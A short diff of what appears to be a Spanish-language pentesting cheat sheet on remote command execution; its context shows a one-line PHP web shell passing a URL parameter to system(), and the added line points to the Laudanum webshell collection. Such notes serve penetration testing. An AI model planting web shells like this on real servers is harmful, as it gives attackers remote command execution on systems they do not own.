@@ -52,6 +52,7 @@ Para testear ejecución remota de comandos:
 ## <?php system($_GET[‘cmd’]);?>
 ```
 
+Otros códigos se pueden encontrar en el directorio ```/usr/share/webshells/laudanum``` o desde el GitHub de [laudanum](https://github.com/adamcaudill/laudanum).
 
 ### PowerShell (cmd)
 
